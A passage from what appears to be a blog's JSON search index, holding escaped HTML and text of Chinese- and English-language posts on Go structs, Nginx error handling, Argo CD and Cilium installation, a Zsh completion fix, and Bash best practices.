if\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e \u003cspan style=\"color:#75715e\"\u003e// needed.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e \u003cspan style=\"color:#a6e22e\"\u003estate1\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003euint64\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e \u003cspan style=\"color:#a6e22e\"\u003estate2\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003euint32\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003enoCopy 定义非常简单，空结构体，zero size 不占用空间(前提是非结构体的最后一个字段，否则还要是有 8 byte 空间开销)\u003c/p\u003e","tags":["URL","Go"],"title":"Gopher 需要知道的几个结构体骚操作"},{"categories":["URL","Nginx"],"contents":" Nginx 怎样隐藏上游错误 Nginx 允许对以下 7 种可以进行重试的错误码启用 next upstream 功能 403 Forbidden 404 Not Found 429 Too Many Requests 500 Internal Server Error 502 Bad Gateway 503 Server Unavailable 504 Gateway Timeout 当上游返回 404 错误时，改为通过 200 返回一张找不到资源的图片 此时，可以通过 proxy_intercept_errors 指令完成这一功能 当 proxy_intercept_errors 开启后，对于上游返回的大于等于 300 响应码的请求，都可以基于 error_page 指令继续处理\nlocation /ih { proxy_pass http://ihBackend; proxy_intercept_errors on; error_page 404 = /404.html; } location = /404.html { alias html/404_not_found.html; } ","date":"December 27, 2021","hero":"/images/hero/nginx.jpeg","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20211227-how-nginx-hide-upstream-errors/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://russelltao.github.io/2021/02/22/nginx/Nginx%E6%80%8E%E6%A0%B7%E9%9A%90%E8%97%8F%E4%B8%8A%E6%B8%B8%E9%94%99%E8%AF%AF/#more\" target=\"_blank\" rel=\"noopener\"\u003eNginx 怎样隐藏上游错误\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"nginx-允许对以下-7-种可以进行重试的错误码启用-next-upstream-功能\"\u003eNginx 允许对以下 7 种可以进行重试的错误码启用 next upstream 功能\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e403 Forbidden\u003c/li\u003e\n\u003cli\u003e404 Not Found\u003c/li\u003e\n\u003cli\u003e429 Too Many Requests\u003c/li\u003e\n\u003cli\u003e500 Internal Server Error\u003c/li\u003e\n\u003cli\u003e502 Bad Gateway\u003c/li\u003e\n\u003cli\u003e503 Server Unavailable\u003c/li\u003e\n\u003cli\u003e504 Gateway Timeout\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"当上游返回-404-错误时改为通过-200-返回一张找不到资源的图片\"\u003e当上游返回 404 错误时，改为通过 200 返回一张找不到资源的图片\u003c/h5\u003e\n\u003cblockquote\u003e\n\u003cp\u003e此时，可以通过 \u003ccode\u003eproxy_intercept_errors\u003c/code\u003e 指令完成这一功能\n当 \u003ccode\u003eproxy_intercept_errors\u003c/code\u003e 开启后，对于上游返回的大于等于 300 响应码的请求，都可以基于 error_page 指令继续处理\u003c/p\u003e\u003c/blockquote\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003elocation\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/ih\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_pass\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ehttp://ihBackend\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_intercept_errors\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eerror_page\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e404\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e/404.html\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003elocation\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e/404.html\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003ealias\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ehtml/404_not_found.html\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Nginx"],"title":"Nginx怎样隐藏上游错误"},{"categories":["URL","Kubernetes","Argo CD","GitOps"],"contents":" Argo CD ApplicationSet Controller: 世界為我而轉動！ Argo CD # 安裝 kind，其他平台安裝方式請參閱官方文件 # 用來運行輕量 K8s Cluster 於本地端 ~$ brew install kind # 安裝 kubectx，其他平台安裝方式請參閱官方文件 # 用來方便切換不同 k8s context ~$ brew install kubectx # 安裝 helm，其他平台安裝方式請參閱官方文件 # K8s 套件管理工具 ~$ brew install helm # 安裝 kubectl, 其他平台安裝方式請參閱官方文件 # 用來與 K8s Cluster API Server 溝通 ~$ brew install kubectl # 安裝 argocd cli, 其他平台安裝方式請參閱官方文件 # 用來與 Argo CD 溝通 ~$ brew install argocd ","date":"December 27, 2021","hero":"/images/hero/kubernetes.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20211227-argo-cd-applicationset-controller/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://medium.com/starbugs/argo-cd-applicationset-controller-%E4%B8%96%E7%95%8C%E7%82%BA%E6%88%91%E8%80%8C%E8%BD%89%E5%8B%95-a837f9392298\" target=\"_blank\" rel=\"noopener\"\u003eArgo CD ApplicationSet Controller: 世界為我而轉動！\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/argoproj/argo-cd\" target=\"_blank\" rel=\"noopener\"\u003eArgo CD\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 安裝 kind，其他平台安裝方式請參閱官方文件\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 用來運行輕量 K8s Cluster 於本地端\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e~$ brew install kind\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 安裝 kubectx，其他平台安裝方式請參閱官方文件\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 用來方便切換不同 k8s context\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e~$ brew install kubectx\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 安裝 helm，其他平台安裝方式請參閱官方文件\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# K8s 套件管理工具\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e~$ brew install helm\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 安裝 kubectl, 其他平台安裝方式請參閱官方文件\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 用來與 K8s Cluster API Server 溝通\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e~$ brew install kubectl\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 安裝 argocd cli, 其他平台安裝方式請參閱官方文件\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 用來與 Argo CD 溝通\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e~$ brew install argocd\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Kubernetes","Argo CD","GitOps"],"title":"Argo CD ApplicationSet Controller: 世界為我而轉動！"},{"categories":["URL","Go","Encrypt","AES"],"contents":" golang 的 AES 加密和解密的三种模式实现（CBC/ECB/CFB) How to encrypt a file using Go ","date":"December 22, 2021","hero":"/images/hero/go.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20211222-aes-encryption-and-decryption-three-modes-implementation/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://blog.csdn.net/mirage003/article/details/87868999\" target=\"_blank\" rel=\"noopener\"\u003egolang 的 AES 加密和解密的三种模式实现（CBC/ECB/CFB)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://levelup.gitconnected.com/a-short-guide-to-encryption-using-go-da97c928259f\" target=\"_blank\" rel=\"noopener\"\u003eHow to encrypt a file using Go\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Go","Encrypt","AES"],"title":"golang的AES加密和解密的三种模式实现（CBC/ECB/CFB)"},{"categories":["URL","Kubernetes","Cilium","Network"],"contents":" 【理解 Cilium 系列文章】(一) 初識 Cilium 當前 k8s Service 負載均衡的實現現狀 在 Cilium 出現之前， Service 由 kube-proxy 來實現，實現方式有 userspace ， iptables ， ipvs 三種模式。\nUserspace 當前模式下，kube-proxy 作為反向代理,監聽隨機端口，通過 iptables 規則將流量重定向到代理端口，再由 kube-proxy 將流量轉發到 後端 pod。Service 的請求會先從用户空間進入內核 iptables，然後再回到用户空間，代價較大，性能較差。\nIptables 存在的問題：\n1.可擴展性差。隨着 service 數據達到數千個，其控制面和數據面的性能都會急劇下降。原因在於 iptables 控制面的接口設計中，每添加一條規則，需要遍歷和修改所有的規則，其控制面性能是 O(n²) 。在數據面，規則是用鏈表組織的，其性能是 O(n)\n2.LB 調度算法僅支持隨機轉發\nIpvs 模式 IPVS 是專門為 LB 設計的。它用 hash table 管理 service，對 service 的增刪查找都是 O(1)的時間複雜度。不過 IPVS 內核模塊沒有 SNAT 功能，因此借用了 iptables 的 SNAT 功能。\nIPVS 針對報文做 DNAT 後，將連接信息保存在 nf_conntrack 中，iptables 據此接力做 SNAT。該模式是目前 Kubernetes 網絡性能最好的選擇。但是由於 nf_conntrack 的複雜性，帶來了很大的性能損耗。騰訊針對該問題做過相應的優化 【繞過 conntrack，使用 eBPF 增強 IPVS 優化 K8s 網絡性能】\nCilium Cilium 是基於 eBpf 的一種開源網絡實現，通過在 Linux 內核動態插入強大的安全性、可見性和網絡控制邏輯，提供網絡互通，服務負載均衡，安全和可觀測性等解決方案。簡單來説可以理解為 Kube-proxy + CNI 網絡實現。\nCilium 位於容器編排系統和 Linux Kernel 之間，向上可以通過編排平台為容器進行網絡以及相應的安全配置，向下可以通過在 Linux 內核掛載 eBPF 程序，來控制容器網絡的轉發行為以及安全策略執行\nlinux 內核要求 4.19 及以上 可以採用 helm 或者 cilium cli ，此處筆者使用的是 cilium cli （版本為 1.10.3 ） # 下載 cilium cli wget https://github.com/cilium/cilium-cli/releases/latest/download/cilium-linux-amd64.tar.gz tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin # 安裝 cilium cilium install --kube-proxy-replacement=strict # 此處選擇的是完全替換，默認情況下是 probe，(該選項下 pod hostport 特性不支持) # 可視化組件 hubble(選裝) cilium hubble enable --ui # pod ready 後，查看 狀態如下 ~# cilium status /¯¯ /¯¯__/¯¯ Cilium: OK __/¯¯__/ Operator: OK /¯¯__/¯¯ Hubble: OK __/¯¯__/ ClusterMesh: disabled __/ DaemonSet cilium Desired: 1, Ready: 1/1, Available: 1/1 Deployment cilium-operator Desired: 1, Ready: 1/1, Available: 1/1 Deployment hubble-relay Desired: 1, Ready: 1/1, Available: 1/1 Containers: hubble-relay Running: 1 cilium Running: 1 cilium-operator Running: 1 Image versions cilium quay.io/cilium/cilium:v1.10.3: 1 cilium-operator quay.io/cilium/operator-generic:v1.10.3: 1 hubble-relay quay.io/cilium/hubble-relay:v1.10.3: 1 ","date":"December 21, 2021","hero":"/images/hero/kubernetes.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20211221-understanding-cilium/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.gushiciku.cn/pl/geTr/zh-hk\" target=\"_blank\" rel=\"noopener\"\u003e【理解 Cilium 系列文章】(一) 初識 Cilium\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"當前-k8s-service-負載均衡的實現現狀\"\u003e當前 k8s Service 負載均衡的實現現狀\u003c/h4\u003e\n\u003cp\u003e在 Cilium 出現之前， Service 由 kube-proxy 來實現，實現方式有 userspace ， iptables ， ipvs 三種模式。\u003c/p\u003e\n\u003ch5 id=\"userspace\"\u003eUserspace\u003c/h5\u003e\n\u003cp\u003e當前模式下，kube-proxy 作為反向代理,監聽隨機端口，通過 iptables 規則將流量重定向到代理端口，再由 kube-proxy 將流量轉發到 後端 pod。Service 的請求會先從用户空間進入內核 iptables，然後再回到用户空間，代價較大，性能較差。\u003c/p\u003e\n\u003ch5 id=\"iptables\"\u003eIptables\u003c/h5\u003e\n\u003cp\u003e存在的問題：\u003c/p\u003e\n\u003cp\u003e1.可擴展性差。隨着 service 數據達到數千個，其控制面和數據面的性能都會急劇下降。原因在於 iptables 控制面的接口設計中，每添加一條規則，需要遍歷和修改所有的規則，其控制面性能是 O(n²) 。在數據面，規則是用鏈表組織的，其性能是 O(n)\u003c/p\u003e\n\u003cp\u003e2.LB 調度算法僅支持隨機轉發\u003c/p\u003e\n\u003ch5 id=\"ipvs-模式\"\u003eIpvs 模式\u003c/h5\u003e\n\u003cp\u003eIPVS 是專門為 LB 設計的。它用 hash table 管理 service，對 service 的增刪查找都是 O(1)的時間複雜度。不過 IPVS 內核模塊沒有 SNAT 功能，因此借用了 iptables 的 SNAT 功能。\u003c/p\u003e\n\u003cp\u003eIPVS 針對報文做 DNAT 後，將連接信息保存在 nf_conntrack 中，iptables 據此接力做 SNAT。該模式是目前 Kubernetes 網絡性能最好的選擇。但是由於 nf_conntrack 的複雜性，帶來了很大的性能損耗。騰訊針對該問題做過相應的優化 【繞過 conntrack，使用 eBPF 增強 IPVS 優化 K8s 網絡性能】\u003c/p\u003e","tags":["URL","Kubernetes","Cilium","Network"],"title":"【理解 Cilium 系列文章】(一) 初識 Cilium"},{"categories":["URL","Kubernetes","Cilium","Network"],"contents":" Kubernetes Without kube-proxy Quick-Start kubeadm init --skip-phases=addon/kube-proxy # Setup Helm repository helm repo add cilium https://helm.cilium.io/ helm install cilium cilium/cilium --version 1.9.18 \\ --namespace kube-system \\ --set kubeProxyReplacement=strict \\ --set k8sServiceHost=REPLACE_WITH_API_SERVER_IP \\ --set k8sServicePort=REPLACE_WITH_API_SERVER_PORT ","date":"December 20, 2021","hero":"/images/hero/kubernetes.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20211220-kubeproxy-free/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://docs.cilium.io/en/v1.9/gettingstarted/kubeproxy-free/\" target=\"_blank\" rel=\"noopener\"\u003eKubernetes Without kube-proxy\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"quick-start\"\u003eQuick-Start\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ekubeadm init --skip-phases\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eaddon/kube-proxy\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Setup Helm repository\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ehelm repo add cilium https://helm.cilium.io/\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ehelm install cilium cilium/cilium --version 1.9.18 \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --namespace kube-system \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --set kubeProxyReplacement\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003estrict \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --set k8sServiceHost\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eREPLACE_WITH_API_SERVER_IP \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --set k8sServicePort\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eREPLACE_WITH_API_SERVER_PORT\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Kubernetes","Cilium","Network"],"title":"Kubernetes Without kube-proxy"},{"categories":["URL","SHELL","ZSH","Completion"],"contents":" Zsh tab-completion not working Question Although I\u0026rsquo;ve used Oh-My-Zsh in the past, I decided this time around (i.e. setting up a new computer) I\u0026rsquo;d try to avoid installing it to keep things a bit leaner. Right now I\u0026rsquo;m trying to cherry-pick Oh-My-Zsh\u0026rsquo;s insensitive tab-completion feature. Digging around its source repo, I found the following line: zstyle ':completion:*' matcher-list 'm:{a-zA-Z}={A-Za-z}' 'r:|=*' 'l:|=* r:|=*'\nI\u0026rsquo;m fairly confident this is the line Oh-My-Zsh executes to do what I want, so I tried adding it to my .zshrc. Restarted my terminal. Typed cd desk, then hit [tab]. No dice \u0026ndash; I didn\u0026rsquo;t get cd Desktop/.\nHere\u0026rsquo;s the entire .zshrc for reference:\n# Source - https://stackoverflow.com/q # Posted by kylemart # Retrieved 2026-01-05, License - CC BY-SA 3.0 # pure shell theme autoload -U promptinit; promptinit prompt pure # completion definitions zstyle \u0026#39;:completion:*\u0026#39; matcher-list \u0026#39;m:{a-zA-Z}={A-Za-z}\u0026#39; \u0026#39;r:|=*\u0026#39; \u0026#39;l:|=* r:|=*\u0026#39; fpath=(/usr/local/share/zsh-completions $fpath) # syntax highlighting (must be last line) source /usr/local/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh Answer Just had to autoload and run compinit.\nHere\u0026rsquo;s the new .zshrc:\n# Source - https://stackoverflow.com/a # Posted by kylemart, modified by community. See post \u0026#39;Timeline\u0026#39; for change history # Retrieved 2026-01-05, License - CC BY-SA 3.0 autoload -U compinit promptinit promptinit prompt pure compinit zstyle \u0026#39;:completion:*\u0026#39; matcher-list \u0026#39;m:{a-zA-Z}={A-Za-z}\u0026#39; \u0026#39;r:|=*\u0026#39; \u0026#39;l:|=* r:|=*\u0026#39; fpath=(/usr/local/share/zsh-completions $fpath) source /usr/local/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh ","date":"December 10, 2021","hero":"/images/hero/shell.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20211210-zsh-tab-completion-not-working/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://stackoverflow.com/questions/46939906/zsh-tab-completion-not-working\" target=\"_blank\" rel=\"noopener\"\u003eZsh tab-completion not working\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"question\"\u003eQuestion\u003c/h4\u003e\n\u003cp\u003eAlthough I\u0026rsquo;ve used Oh-My-Zsh in the past, I decided this time around (i.e. setting up a new computer) I\u0026rsquo;d try to avoid installing it to keep things a bit leaner. Right now I\u0026rsquo;m trying to cherry-pick Oh-My-Zsh\u0026rsquo;s insensitive tab-completion feature. Digging around its source repo, I found the following line:\n\u003ccode\u003ezstyle ':completion:*' matcher-list 'm:{a-zA-Z}={A-Za-z}' 'r:|=*' 'l:|=* r:|=*'\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eI\u0026rsquo;m fairly confident this is the line Oh-My-Zsh executes to do what I want, so I tried adding it to my \u003ccode\u003e.zshrc\u003c/code\u003e. Restarted my terminal. Typed \u003ccode\u003ecd desk\u003c/code\u003e, then hit [tab]. No dice \u0026ndash; I didn\u0026rsquo;t get \u003ccode\u003ecd Desktop/\u003c/code\u003e.\u003c/p\u003e","tags":["URL","SHELL","ZSH","Completion"],"title":"Zsh tab-completion not working"},{"categories":["URL","Kubernetes","Cluster","Linkerd","Service Mesh"],"contents":" Linkerd 2.8 - 實現超級簡單又安全的多叢集(multicluster) Kubernetes 架構 ","date":"December 9, 2021","hero":"/images/hero/kubernetes.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20211209-linkerd-multi-kubernetes-cluster-feature-overview/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://rammusxu.github.io/2020/07/28/Linkerd-Multi-Kubernetes-Cluster-Feature-Overview/\" target=\"_blank\" rel=\"noopener\"\u003eLinkerd 2.8 - 實現超級簡單又安全的多叢集(multicluster) Kubernetes 架構\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Kubernetes","Cluster","Linkerd","Service Mesh"],"title":"Linkerd 2.8 - 實現超級簡單又安全的多叢集(multicluster) Kubernetes 架構"},{"categories":["URL","SHELL","BASH"],"contents":" Best Practices for Writing Bash Scripts Shell Scripting - Best Practices #!/usr/bin/env bash # Bash3 Boilerplate. Copyright (c) 2014, kvz.io set -o errexit set -o pipefail set -o nounset # set -o xtrace # Set magic variables for current file \u0026amp; dir __dir=\u0026#34;$(cd \u0026#34;$(dirname \u0026#34;${BASH_SOURCE[0]}\u0026#34;)\u0026#34; \u0026amp;\u0026amp; pwd)\u0026#34; __file=\u0026#34;${__dir}/$(basename \u0026#34;${BASH_SOURCE[0]}\u0026#34;)\u0026#34; __base=\u0026#34;$(basename ${__file} .sh)\u0026#34; __root=\u0026#34;$(cd \u0026#34;$(dirname \u0026#34;${__dir}\u0026#34;)\u0026#34; \u0026amp;\u0026amp; pwd)\u0026#34; # \u0026lt;-- change this as it depends on your app arg1=\u0026#34;${1:-}\u0026#34; Use shift to read function arguments This makes it easier to reorder arguments, if you change your mind later.\n# Processes a file. # $1 - the name of the input file # $2 - the name of the output file process_file(){ local -r input_file=\u0026#34;$1\u0026#34;; shift local -r output_file=\u0026#34;$1\u0026#34;; shift } Declare your variables If portability is a concern, use typeset instead of declare.\ndeclare -r -i port_number=8080 declare -r -a my_array=( apple orange ) my_function() { local -r name=apple } Quote all parameter expansions Use arrays where appropriate # using a string to hold a collection declare -r hosts=\u0026#34;host1 host2 host3\u0026#34; for host in $hosts # not quoting $hosts here, since we want word splitting do echo \u0026#34;$host\u0026#34; done # use an array instead! declare -r -a host_array=( host1 host2 host3 ) for host in \u0026#34;${host_array[@]}\u0026#34; do echo \u0026#34;$host\u0026#34; done Use \u0026ldquo;$@\u0026rdquo; to refer to all arguments Don\u0026rsquo;t use $*.\nmain() { # print each argument for i in \u0026#34;$@\u0026#34; do echo \u0026#34;$i\u0026#34; done } # pass all arguments to main main \u0026#34;$@\u0026#34; Use uppercase variable names for environment variables only Prefer shell builtins over external programs declare -r my_file=\u0026#34;/var/tmp/blah\u0026#34; # instead of dirname, use: declare -r file_dir=\u0026#34;{my_file%/*}\u0026#34; # instead of basename, use: declare -r file_base=\u0026#34;{my_file##*/}\u0026#34; # instead of sed \u0026#39;s/blah/hello\u0026#39;, use: declare -r new_file=\u0026#34;${my_file/blah/hello}\u0026#34; # instead of bc \u0026lt;\u0026lt;\u0026lt; \u0026#34;2+2\u0026#34;, use: echo $(( 2+2 )) # instead of grepping a pattern in a string, use: [[ $line =~ .*blah$ ]] # instead of cut -d:, use an array: IFS=: read -a arr \u0026lt;\u0026lt;\u0026lt; \u0026#34;one:two:three\u0026#34; Avoid unnecessary pipelines Avoid unnecessary cat\n# instead of cat file | command # use command \u0026lt; file Avoid unnecessary echo\n# instead of echo text | command # use command \u0026lt;\u0026lt;\u0026lt; text # for portability, use a heredoc command \u0026lt;\u0026lt; END text END Avoid unnecessary grep\n# instead of grep pattern file | awk \u0026#39;{print $1}\u0026#39; # use awk \u0026#39;/pattern/{print $1}\u0026#39; # instead of grep pattern file | sed \u0026#39;s/foo/bar/g\u0026#39; # use sed -n \u0026#39;/pattern/{s/foo/bar/p}\u0026#39; file Avoid parsing ls Instead of ls, use file globbing or an alternative command which outputs null terminated filenames, such as find -print0.\nUse globbing In bash, you can make globbing more powerful by enabling extended pattern matching operators using the extglob shell option.\nAlso, enable nullglob so that you get an empty list if no matches are found.\nshopt -s nullglob shopt -s extglob # get all files with a .yyyymmdd.txt suffix declare -a dated_files=( *.[0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9].txt ) # get all non-zip files declare -a non_zip_files=( !(*.zip) ) Use null delimited output where possible In order to correctly handle filenames containing whitespace and newline characters, you should use null delimited output, which results in each line being terminated by a NUL (00) character instead of a newline. Most programs support this. For example, find -print0 outputs filenames followed by a null character and xargs -0 reads arguments separated by null characters.\n# instead of find . -type f -mtime +5 | xargs rm -f # use find . -type f -mtime +5 -print0 | xargs -0 rm -f # looping over files find . -type f -print0 | while IFS= read -r -d $\u0026#39;\u0026#39; filename; do echo \u0026#34;$filename\u0026#34; done Don\u0026rsquo;t use backticks Use process substitution instead of creating temporary files # using temp files command1 \u0026gt; file1 command2 \u0026gt; file2 diff file1 file2 rm file1 file2 # using process substitution diff \u0026lt;(command1) \u0026lt;(command2) Use mktemp if you have to create temporary files Use [[ and (( for test conditions Use commands in test conditions instead of exit status # don\u0026#39;t use exit status grep -q pattern file if (( $? == 0 )) then echo \u0026#34;pattern was found\u0026#34; fi # use the command as the condition if grep -q pattern file then echo \u0026#34;pattern was found\u0026#34; fi Use set -e Write error messages to stderr echo \u0026#34;An error message\u0026#34; \u0026gt;\u0026amp;2 ","date":"December 6, 2021","hero":"/images/hero/shell.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20211206-bash-best-practices/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://kvz.io/bash-best-practices.html\" target=\"_blank\" rel=\"noopener\"\u003eBest Practices for Writing Bash Scripts\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.javacodegeeks.com/2013/10/shell-scripting-best-practices.html\" target=\"_blank\" rel=\"noopener\"\u003eShell Scripting - Best Practices\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre 